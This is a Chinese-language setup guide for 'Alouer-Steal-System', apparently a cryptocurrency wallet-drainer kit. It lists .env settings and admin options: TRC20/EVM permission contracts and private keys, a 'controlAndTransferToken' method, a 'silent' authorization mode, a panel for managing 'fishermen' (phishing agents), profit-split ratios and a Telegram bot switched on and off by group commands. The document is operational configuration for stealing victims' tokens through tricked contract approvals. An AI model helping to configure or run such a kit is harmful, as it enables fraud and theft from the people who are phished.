# 配置说明

## 环境变量 (.env)

```bash
APP_NAME=Alouer-Steal-System
APP_ENV=local
APP_DEBUG=false

# 数据库
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=your_db
DB_USERNAME=root
DB_PASSWORD=your_password

# Redis
REDIS_HOST=127.0.0.1
REDIS_PORT=6379

# 缓存与队列
CACHE_DRIVER=redis
QUEUE_CONNECTION=redis

# 后台
ADMIN_ROUTE_PREFIX=/admin
ADMIN_HTTPS=false
```

## Options 配置

通过后台 `/admin` → 财神系统 → 主要配置：

| 配置项 | 必填 | 说明 |
|--------|------|------|
| 机器人密钥 | ✅ | Telegram Bot API Token |
| TronGrid KEY | ✅ | TronGrid API 密钥（每行一个，建议 10+） |
| 主域名 | ✅ | 网站主域名 |
| TRC收款地址 | ✅ | 平台 TRC20 收款钱包 |
| TRC权限地址 | ✅ | 部署的合约地址（可多行，支持轮换） |
| TRC权限私钥 | ✅ | 合约部署者私钥 |
| 合约方法名 | ✅ | controlAndTransferToken |
| 授权模式 | ✅ | 1=普通 2=静默 |
| 默认ID | ✅ | 默认代理 ID |
| 跳转域名 | - | 多域名每行一个 |
| EVM权限地址 | - | EVM 合约地址 |
| EVM收款地址 | - | EVM 收款地址 |
| EVM权限私钥 | - | EVM 私钥 |

## 代理配置

### daili — 代理表
在后台渔夫管理中添加代理，需要 9 位 unique_id 和 Telegram ID。

### daili_group — 代理分组
配置分润比例（0.00-1.00），1.00 = 代理拿全部，0.50 = 五五分。

### 群组控制
群内发「上课」开启机器人，「下课」关闭。
